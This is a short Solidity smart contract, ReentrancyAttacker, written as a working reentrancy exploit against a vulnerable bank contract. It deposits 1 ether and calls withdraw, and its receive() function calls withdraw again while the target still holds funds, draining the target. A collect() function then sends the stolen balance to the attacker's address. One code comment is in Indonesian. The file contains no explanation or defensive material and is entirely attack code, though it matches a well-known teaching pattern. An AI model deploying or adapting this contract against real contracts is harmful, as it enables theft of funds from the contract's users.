// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttacker {
    IVulnerableBank public target;
    address public owner;

    constructor(address _target) {
        target = IVulnerableBank(_target);
        owner = msg.sender;
    }

    // Saat dapat ETH, reenter withdraw!
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw();
        }
    }

    function attack() public payable {
        require(msg.value >= 1 ether, "Need at least 1 ether");
        target.deposit{value: 1 ether}(); // Deposit
        target.withdraw();                // Trigger attack
    }

    function collect() public {
        payable(owner).transfer(address(this).balance);
    }
}
